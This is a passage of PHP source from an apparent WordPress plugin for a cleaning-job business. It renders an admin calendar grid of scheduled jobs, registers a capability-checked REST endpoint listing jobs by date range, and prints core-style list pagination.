			$grid_start = 'month' === $view ? strtotime( '-' . ( (int) gmdate( 'N', $start ) - 1 ) . ' days', $start ) : $start;
			$grid_end   = 'month' === $view ? strtotime( '+' . ( 7 - (int) gmdate( 'N', $end ) ) . ' days', $end ) : $end;
			$cap        = 'month' === $view ? 4 : PHP_INT_MAX;
			?>
			<table class="widefat jrc-cal-grid jrc-cal-grid--<?php echo esc_attr( $view ); ?>">
				<thead><tr>
					<?php for ( $i = 0; $i < 7; $i++ ) :
						$hd = strtotime( '+' . $i . ' days', $grid_start ); ?>
						<th style="text-align:left;width:14.28%"><?php echo esc_html( 'week' === $view ? gmdate( 'D j M', $hd ) : gmdate( 'D', $hd ) ); ?></th>
					<?php endfor; ?>
				</tr></thead>
				<tbody>
					<tr>
					<?php
					$col = 0;
					for ( $ts = $grid_start; $ts <= $grid_end; $ts = strtotime( '+1 day', $ts ) ) {
						if ( 7 === $col ) { echo '</tr><tr>'; $col = 0; }
						$ymd     = gmdate( 'Y-m-d', $ts );
						$outside = 'month' === $view && gmdate( 'm', $ts ) !== gmdate( 'm', $start );
						$list    = $outside ? array() : ( $byday[ $ymd ] ?? array() );
						$is_tod  = $ymd === $today_ymd;
						echo '<td style="' . ( 'month' === $view ? 'height:118px;' : '' ) . ( $outside ? 'background:#f6f7f7;' : '' ) . ( $is_tod ? 'box-shadow:inset 0 0 0 2px #2271b1;' : '' ) . '">';
						if ( ! $outside ) {
							printf(
								'<a class="jrc-cal-day%s" href="%s">%s</a>%s',
								$is_tod ? ' is-today' : '',
								$url( array( 'view' => 'day', 'd' => $ymd ) ), // phpcs:ignore WordPress.Security.EscapeOutput
								esc_html( 'week' === $view ? count( $list ) . ' ' . _n( 'clean', 'cleans', count( $list ), 'jrc-partners' ) : gmdate( 'j', $ts ) ),
								'month' === $view && $list ? ' <span style="color:#8c8f94;font-size:11px;">(' . count( $list ) . ')</span>' : ''
							);
							foreach ( array_slice( $list, 0, $cap ) as $j ) {
								$event( $j, 'month' === $view );
							}
							if ( count( $list ) > $cap ) {
								echo '<a class="jrc-cal-more" href="' . $url( array( 'view' => 'day', 'd' => $ymd ) ) . '">+' . (int) ( count( $list ) - $cap ) . ' more</a>'; // phpcs:ignore WordPress.Security.EscapeOutput
							}
						}
						echo '</td>';
						$col++;
					}
					?>
					</tr>
				</tbody>
			</table>
		<?php endif; ?>
	</div>
	<?php
}

/**
 * REST feed of jobs in a date range.
 *
 * Not used by the calendar above (which renders server-side) but exists so an external
 * scheduling system, or a richer client-side view, has a documented endpoint.
 * Addresses are included only for users who can already see them in admin.
 */
add_action( 'rest_api_init', function () {
	register_rest_route( 'jrc/v1', '/jobs', array(
		'methods'             => 'GET',
		'permission_callback' => function () { return current_user_can( jrc_reports_cap() ); },
		'args'                => array(
			'from'    => array( 'sanitize_callback' => 'sanitize_text_field' ),
			'to'      => array( 'sanitize_callback' => 'sanitize_text_field' ),
			'channel' => array( 'sanitize_callback' => 'sanitize_key' ),
			'subtype' => array( 'sanitize_callback' => 'sanitize_key' ),
		),
		'callback'            => function ( $req ) {
			$rows = jrc_jobs_query( array(
				'date_field' => 'scheduled_date',
				'date_from'  => (string) $req->get_param( 'from' ),
				'date_to'    => (string) $req->get_param( 'to' ),
				'channel'    => (string) $req->get_param( 'channel' ),
				'subtype'    => (string) $req->get_param( 'subtype' ),
				'limit'      => 2000,
			) );
			$out = array();
			foreach ( $rows as $r ) {
				$a     = jrc_report_account( (int) $r->user_id );
				$out[] = array(
					'id'        => (int) $r->id,
					'title'     => $r->job_type . ' — ' . $a['name'],
					'start'     => $r->scheduled_date ? mysql_to_rfc3339( $r->scheduled_date ) : null,
					'status'    => $r->status,
					'address'   => $r->address,
					'affiliate' => $a['name'],
					'channel'   => $a['channel'],
					'subtype'   => $a['subtype'],
				);
			}
			return rest_ensure_response( $out );
		},
	) );
} );

/**
 * WordPress-core list-table pagination ("230 jobs « ‹ [1] of 5 › »").
 *
 * The same markup core's WP_List_Table prints, so it picks up the admin styles as-is
 * and looks like every other list screen. Links keep the current filters and sort.
 *
 * @param int    $total Items in the filtered set.
 * @param int    $per   Items per page.
 * @param int    $paged Current page.
 * @param string $which 'top' (with a page-number box) or 'bottom'.
 */
function jrc_admin_pagination( $total, $per, $paged, $which = 'bottom' ) {
	$total = (int) $total;
	$pages = max( 1, (int) ceil( $total / max( 1, (int) $per ) ) );
	$paged = min( max( 1, (int) $paged ), $pages );
	$base  = remove_query_arg( array( 'paged', 'matched', 'unmatched', 'rows' ) );
	$url   = function ( $n ) use ( $base ) {
		return esc_url( 1 === $n ? $base : add_query_arg( 'paged', $n, $base ) );
	};
	$btn = function ( $n, $class, $label, $glyph, $enabled ) use ( $url ) {
		if ( ! $enabled ) {
			return '<span class="tablenav-pages-navspan button disabled" aria-hidden="true">' . $glyph . '</span>';
		}
		return sprintf(
			'<a class="%s button" href="%s"><span class="screen-reader-text">%s</span><span aria-hidden="true">%s</span></a>',
			esc_attr( $class ), $url( $n ), esc_html( $label ), $glyph
		);
	};

	$classes = 'tablenav-pages' . ( $pages <= 1 ? ' one-page' : '' );
	echo '<div class="tablenav ' . esc_attr( $which ) . '"><div class="' . esc_attr( $classes ) . '">';
	echo '<span class="displaying-num">' . esc_html( sprintf( _n( '%s job', '%s jobs', $total, 'jrc-partners' ), number_format_i18n( $total ) ) ) . '</span>';

	if ( $pages > 1 ) {
		echo '<span class="pagination-links">';
		echo $btn( 1, 'first-page', 'First page', '&laquo;', $paged > 2 ); // phpcs:ignore WordPress.Security.EscapeOutput -- built from escaped parts.
		echo ' ' . $btn( $paged - 1, 'prev-page', 'Previous page', '&lsaquo;', $paged > 1 ); // phpcs:ignore WordPress.Security.EscapeOutput

		if ( 'top' === $which ) {
			// A tiny GET form so typing a page number works, carrying every current filter.
			echo ' <form method="get" style="display:inline;">';
			foreach ( wp_unslash( $_GET ) as $k => $v ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended, WordPress.Security.ValidatedSanitizedInput
				if ( in_array( $k, array( 'paged', 'matched', 'unmatched', 'rows' ), true ) || is_array( $v ) ) {
					continue;
				}
				echo '<input type="hidden" name="' . esc_attr( $k ) . '" value="' . esc_attr( $v ) . '" />';
			}
			printf(
				'<span class="paging-input"><label for="current-page-selector" class="screen-reader-text">Current page</label><input class="current-page" id="current-page-selector" type="text" name="paged" value="%d" size="%d" aria-describedby="table-paging" /><span class="tablenav-paging-text"> of <span class="total-pages">%s</span></span></span>',
				(int) $paged, strlen( (string) $pages ), esc_html( number_format_i18n( $pages ) )
			);
			echo '</form> ';
		} else {
			printf(
				' <span class="screen-reader-text">Current page</span><span id="table-paging" class="paging-input"><span class="tablenav-paging-text">%d of <span class="total-pages">%s</span></span></span> ',
				(int) $paged, esc_html( number_format_i18n( $pages ) )
			);
		}

		echo $btn( $paged + 1, 'next-page', 'Next page', '&rsaquo;', $paged < $pages ); // phpcs:ignore WordPress.Security.EscapeOutput
		echo ' ' . $btn( $pages, 'last-page', 'Last page', '&raquo;', $paged < $pages - 1 ); // phpcs:ignore WordPress.Security.EscapeOutput
		echo '</span>';
	}

	echo '</div><br class="clear" /></div>';
}

